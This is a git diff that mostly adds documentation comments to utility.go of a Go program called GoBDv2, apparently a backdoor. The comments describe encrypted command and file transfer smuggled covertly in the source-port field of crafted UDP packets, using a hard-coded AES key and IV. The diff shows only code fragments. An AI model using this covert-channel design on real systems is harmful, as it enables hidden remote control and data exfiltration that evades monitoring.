@@ -1,4 +1,23 @@
 package main
+/* utility.go
+PROGRAM: GoBDv2 Final
+AUTHOR: Ramzi Chennafi
+DATE: November 18 2015
+FUNCTIONS:
+     intiateTools()
+     encrypt_data([]byte) []byte
+     decrypt_data([]byte) []byte
+     sendEncryptedData(uint16, string, string, []byte)
+     craftPacket([]byte, string, uint16, []byte) []byte
+     GetLocalMAC(string) net.HardwareAddr
+     GetLocalIP() net.IP
+     checkError(error)
+     SetProcessName(string) error
+
+ABOUT:
+     Contains all utility functions for the GoBD program, this includes packet crafting, encryption error checking
+     and internal commands.
+*/
 import(
 	"reflect"
 	"unsafe"
@@ -20,7 +39,8 @@ var block cipher.Block;
     RETURNS: Nothing
 
     ABOUT:
-    Intiates the the iv and the cipher block for encryption and decryption.
+    Intiates the the iv and the cipher block for encryption and decryption. Not the 
+    most cryptographily secure, replace with random key/IV generation or your own key/IV to improve.
 */
 func intiateTools(){
 
@@ -30,7 +50,7 @@ func intiateTools(){
 	iv = ciphercode[:aes.BlockSize];
 }
 /* 
-    FUNCTION: func encrypt_data(data string) []byte
+    FUNCTION: encrypt_data(data []byte) []byte
     RETURNS: []byte, the encrypted data
     ARGUMENTS: 
    1             string data - the data to encrypt
@@ -47,8 +67,8 @@ func encrypt_data(data []byte) []byte {
 	return ciphertext;
 }
 /* 
-    FUNCTION: func decrypt_data(data []byte) string
-    RETURNS: String, the decrypted data
+    FUNCTION: decrypt_data(data []byte) []byte
+    RETURNS: []byte, the decrypted data
     ARGUMENTS: 
                 []byte data - the encrypted data to decrypt
 
@@ -64,14 +84,16 @@ func decrypt_data(data []byte) []byte {
 	return plaintextCopy[:]
 }
 /* 
-    FUNCTION: sendEncryptedData(port int, data, ip string)
+    FUNCTION: sendEncryptedData(port uint16, data, ip string, mode int)
     RETURNS: Nothing
     ARGUMENTS: 
-                string ip : the ip address of the server
-                int port : port to send data to
-
+                uint16 port - the port to send the data to
+                string ip   - the ip to send the data to
+                string data - the data to send 
+                int mode    - the mode of the send, either CMD or FTRANSFER (command/file transfer)
     ABOUT:
-    Sends encrypted data over UDP to the spcified port and ip.
+    Sends encrypted data over UDP covertly to the specified ip and port. Sends a completetion packet after the end
+    of any transfer.
 */
 func sendEncryptedData(port uint16, data, ip string, mode int) {
 
@@ -107,7 +129,19 @@ func sendEncryptedData(port uint16, data, ip string, mode int) {
 		checkError(err)
 	}
 }
+/* 
+    FUNCTION: craftPacket(data []byte, ip string, port uint16, payload []byte) []byte
+    RETURNS: []byte, byte array containing packet data created
+    ARGUMENTS: 
+              []byte data - data to be placed in the source port
+              string ip   - address to place in the dst ip of the ip layer
+              uint16 port - destination port of udp header
+              []byte payload - udp payload to be passed in
 
+    ABOUT:
+    Crafts a packet with a IP, ethernet and UDP header. Covertly inserts data into
+    the source port and appends the specified payload.
+*/
 func craftPacket(data []byte, ip string, port uint16, payload []byte) []byte {
 	
 	ethernetLayer := &layers.Ethernet{
@@ -152,7 +186,6 @@ func craftPacket(data []byte, ip string, port uint16, payload []byte) []byte {
 
 	return buf.Bytes()
 }
-///Utility Functions//////////////////////////////////////////
 /* 
     FUNCTION: func checkError(err error)
     RETURNS: Nothing
@@ -209,6 +242,15 @@ func GetLocalIP() net.IP {
 	
 	return nil;
 }
+/* 
+    FUNCTION: GetLocalMAC(iface string) (macAddr net.HardwareAddr)
+    RETURNS: net.HardwareAddr, the mac address of the specified iface
+    ARGUMENTS: 
+                string iface: the name of the interface to get the macaddress for
+
+    ABOUT:
+    Returns the mac address of the specified interface.
+*/
 func GetLocalMAC(iface string) (macAddr net.HardwareAddr){
 
 	netInterface, err := net.InterfaceByName(iface)
